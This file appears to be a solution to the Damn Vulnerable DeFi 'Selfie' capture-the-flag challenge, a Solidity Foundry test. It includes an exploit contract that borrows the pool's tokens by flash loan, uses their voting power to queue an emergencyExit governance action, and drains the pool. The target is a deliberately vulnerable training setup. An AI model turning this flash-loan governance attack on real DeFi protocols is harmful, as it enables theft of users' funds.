// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

// @audit-info import FlashBorrower
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    // @audit-info initialize exploit contract variable
    SelfieExploit exploit;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // new iterative idea
        // 1 - flashloan for voting power
        // 2 - propose an action with emergency withdraw as action 
        exploit = new SelfieExploit(address(pool), address(recovery), address(governance), address(token));
        exploit.exploit();
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(exploit.getID());

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}


contract SelfieExploit is IERC3156FlashBorrower {
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;
    DamnValuableVotes token;
    uint256 ID;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;


    constructor(
        address _pool,
        address _recovery,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_pool);
        recovery = _recovery;
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
    }

    function exploit() external {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "" );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        // pool.deposit{value: msg.value}();
        // idea create a vote with the flashloan
        token.delegate(address(this));

        bytes memory data = abi.encodeWithSelector(
            pool.emergencyExit.selector,
            recovery
        );

        ID = governance.queueAction(address(pool), 0, data);

        IERC20(token).approve(address(pool), amount);

        // 4️⃣ Return success value required by ERC3156
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }


    function getID()  external view returns (uint256) {
        return ID;
    }

    receive() external payable {}
}